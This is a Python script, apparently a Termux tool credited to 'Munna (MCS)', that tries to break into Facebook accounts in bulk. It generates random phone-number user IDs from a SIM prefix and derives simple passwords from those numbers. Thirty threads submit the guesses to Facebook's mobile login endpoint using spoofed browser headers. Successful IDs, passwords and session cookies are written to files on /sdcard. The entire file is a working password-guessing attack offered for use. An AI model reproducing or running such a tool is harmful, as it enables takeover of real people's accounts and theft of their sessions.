"""script owner Munna (MCS) enjoy a simple gift from me """

import os,time
os.system('clear')
os.system("git pull")
from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        import datetime
        import sys
        from concurrent.futures import ThreadPoolExecutor as tred
        current_date = datetime.datetime.now()
        current_time = current_date.strftime("%H:%M:%S")
        current_year = current_date.year
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
except:pass
user=[]
ok=[]
cp=[]
loop=0
black = "\033[1;30m"
green = "\033[1;32m"
white = "\033[1;37m"
logo=('''\033[1;37m
\t\x1b[1;92m███    ███     ██████    ███████ 
\t\x1b[1;92m████  ████    ██         ██      
\t\x1b[1;92m██ ████ ██    ██         ███████ 
\t\x1b[1;92m██  ██  ██    ██              ██ 
\t\x1b[1;92m██      ██ ██  ██████ ██ ███████ ''')
def clear():
    os.system('clear')
    print(logo)
def line():
    print(56*'\033[0;36m─')
def htx_main():
    clear()
    line()
    print('\033[1;97m[\033[1;32m1\033[1;97m] RANDOM UID CRACK')
    print('\033[1;97m[\033[1;32m0\033[1;97m] EXIT')
    line()
    htx=input('\033[1;93mCHOOSE : ')
    if htx in '1':
        htx_rndm()
    if htx in '0':
        exit()
    else:
        htx_main()

def htx_rndm():
    clear()
    line()
    print('\033[1;35mEXAMPLE : 017 • 018 • 019 ')
    line()
    code=input('\033[1;93mSIM CODE : ')
    line()
    print("\033[1;92mEXAMPLE : 5000 • 10000 • 20000 • 30000")
    line()
    limit=int(input('\033[1;93mCRCAK LIMIT : '))
    for x in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as mehedi:
        os.system("clear")
        print(logo)
        line()
        total=str(len(user))
        for cudi in user:
            uid=code+cudi
            ak=uid[:7]
            st=uid[0:7]
            lm=uid[:6]
            hs=uid[0:6]
            pss=[uid,cudi,ak,st,lm,hs]
            mehedi.submit(h4x_cracker,uid,pss,total)
    line()
    print(f' TOTAL OK/CP : {str(len(ok))}/{str(len(cp))}')
    line()

def h4x_cracker(uid,pss,total):
    global ok
    global loop
    global cp
    try:
        for ps in pss:
            session=requests.Session()
            output_string = f'\r{black}[{green}{current_date.strftime("%B")}{black}]{white}-{black}[{green}{current_date.strftime("%d")}{black}]{white}-{black}[{green}{current_year}{black}]{white}-{black}[{green}{loop}{white}/{green}{total}{black}]{white}{black}[{green}OK{black}]{white}-{green}{len(ok)}\r'
            sys.stdout.write(output_string)
            sys.stdout.flush()
            ua2=kolop()
            xs = requests.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=739959012779189&kid_directed_site=0&app_id=739959012779189&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D739959012779189%26redirect_uri%3Dhttps%253A%252F%252Fauth.fastwork.id%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf7eebb-e161-409b-a6ff-ce160c7a328f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.fastwork.id%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
            data = {
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(xs)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(xs)).group(1),
            "try_number":0,
            "unrecognized_tries":0,
            "email":uid,
            "prefill_contact_point":"",
            "prefill_source":"",
            "prefill_type":"",
            "first_prefill_source":"",
            "first_prefill_type":"",
            "had_cp_prefilled":False,
            "had_password_prefilled":False,
            "is_smart_lock":False,
            "bi_xrwh":0,
            'encpass': "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"', str(xs)).group(1), ps),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(xs)).group(1),
            "lsd":re.search('name="lsd" value="(.*?)"', str(xs)).group(1),
            "__dyn":"",
            "__csr":"",
            "__req":random.choice(["1","2","3","4","5","6","7","8","9","0"]),
            "__a":"",
            "__user":0
            }
            headers = {
            'Host': 'm.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '1.7125',
            'origin': 'https://m.facebook.com',
            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=739959012779189&kid_directed_site=0&app_id=739959012779189&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D739959012779189%26redirect_uri%3Dhttps%253A%252F%252Fauth.fastwork.id%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf7eebb-e161-409b-a6ff-ce160c7a328f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.fastwork.id%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"V2027"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'viewport-width': '421',
            'x-asbd-id': '129477',
            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(xs)).group(1),
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream',
            }
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=headers,allow_redirects=False).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idf = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\033[38;5;46m[MCS-OK] {idf} | {ps}')
                open('/sdcard/MCS.OK.txt','a').write(idf+'|'+ps+'|'+coki+'\n')
                ok.append(idf)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                idf = "1000"+coki1[0:11]
                print(f'\033[1;31m[MCS-CP] {idf} | {ps}')
                open('/sdcard/MCS.Cp.txt','a').write(idf+'|'+ps+'\n')
                cp.append(idf)
                break
            else:
                continue
        loop+=1
    except:
        pass


htx_main()